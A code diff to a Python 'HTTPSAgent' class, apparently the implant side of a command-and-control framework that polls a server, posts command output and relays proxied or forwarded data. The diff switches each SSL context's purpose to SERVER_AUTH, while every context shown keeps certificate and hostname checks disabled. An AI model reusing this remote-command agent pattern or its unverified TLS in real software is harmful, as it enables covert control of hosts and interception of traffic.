@@ -25,7 +25,7 @@ class HTTPSAgent(LocalAgent):
 		return os.path.realpath(__file__) 
         
 	def postHTTPS(self, headers, resource, cmd_output):
-		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 		ssl_context.check_hostname = False
 		ssl_context.verify_mode = ssl.CERT_NONE
 		connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
@@ -62,7 +62,7 @@ class HTTPSAgent(LocalAgent):
             
 	def pollServer(self):
 		try:    
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 			ssl_context.check_hostname = False
 			ssl_context.verify_mode = ssl.CERT_NONE
 			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
@@ -84,7 +84,7 @@ class HTTPSAgent(LocalAgent):
 		try:    
 			localheaders = self.headers.copy()
 			localheaders['ForwardRequest'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 			ssl_context.check_hostname = False
 			ssl_context.verify_mode = ssl.CERT_NONE
 			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
@@ -102,7 +102,7 @@ class HTTPSAgent(LocalAgent):
 		try:    
 			localheaders = self.headers.copy()
 			localheaders['ProxyId'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 			ssl_context.check_hostname = False
 			ssl_context.verify_mode = ssl.CERT_NONE
 			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
@@ -121,7 +121,7 @@ class HTTPSAgent(LocalAgent):
 			im_b64 = base64.b64encode(data).decode('ascii')
 			localheaders = self.headers.copy()
 			localheaders['ProxyId'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 			ssl_context.check_hostname = False
 			ssl_context.verify_mode = ssl.CERT_NONE
 			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
@@ -135,7 +135,7 @@ class HTTPSAgent(LocalAgent):
 			im_b64 = base64.b64encode(data).decode('ascii')
 			localheaders = self.headers.copy()
 			localheaders['ForwardRequest'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH) 
+			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
 			ssl_context.check_hostname = False
 			ssl_context.verify_mode = ssl.CERT_NONE
 			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
